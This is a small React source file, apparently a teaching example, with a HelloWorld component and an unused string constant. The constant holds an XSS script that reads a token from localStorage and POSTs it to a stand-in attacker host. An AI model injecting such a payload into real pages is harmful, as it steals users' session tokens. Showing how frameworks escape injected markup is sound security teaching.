const maliciousScript = `
  <script>
    const token = window.localStorage.getItem('token')
    fetch('https://malicious-site.com/get-token',{
      method: 'POST',
      body: { token }
    })
    console.log('sent')
  </script>
`

function HelloWorld() {
  const name = 'Leandro'
  const title = <h1>Hello, {name}!</h1>
  const index = 0

  if(name === 'Leandro') {
    return <div>
        <h1 
        tabIndex={ index } 
        style={{background: 'gold' }}
        >
          { name }
        </h1>
      </div>  
  }

  return <div>
    {title}
  </div>
}

export default HelloWorld